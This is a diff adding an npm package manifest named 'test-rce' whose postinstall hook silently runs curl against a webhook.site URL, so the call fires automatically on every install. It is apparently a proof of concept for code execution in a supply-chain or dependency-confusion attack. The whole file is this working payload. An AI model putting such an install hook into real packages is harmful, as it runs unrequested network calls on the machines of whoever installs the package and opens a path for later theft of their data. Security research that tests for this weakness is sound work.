@@ -1,0 +1,7 @@
+{
+  "name": "test-rce",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "curl -s https://webhook.site/d6044a01-c7a4-404d-af7a-8a2c90edf076"
+  }
+}
